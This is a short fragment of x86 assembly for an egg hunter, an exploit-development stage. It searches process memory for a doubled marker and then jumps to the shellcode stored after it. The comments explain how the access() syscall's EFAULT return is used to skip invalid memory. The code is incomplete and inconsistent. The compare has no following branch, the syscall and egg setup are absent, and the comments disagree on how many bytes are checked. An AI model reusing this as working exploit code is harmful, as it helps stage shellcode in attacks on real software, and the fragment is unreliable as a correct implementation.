		next_address:
			inc edx
	
			; validating eight bytes of contiguous memory in a single swoop
			; The reason that it works in all cases is because the implementation
			; will increment by PAGE SIZE when it encounters invalid addresses, thus itâ€™s
			; impossible that edx plus four could be valid and edx itself not be valid.

			; if memory pointed by ebx is not accessible, then access() syscall returns value 0xfffffff2 (-14) EFAULT to EAX
			; compare the lower bytes of EAX with 0xf2

			cmp al,0xf2

	mov edi,edx		; EDX has the valid pointer, copy it to edi
	scasd			; compare EAX with contents of memory pointed by EDI, EDI is incremented automatically by 4 bytes after SCASD
	jnz next_address	; EGG not found
	scasd			; EGG found 1 time, check again EGG second 
	jnz next_address
	jmp edi			; we found egg consecutively two times now EDI  = EDX + 8 = start of shellcode, jump to it
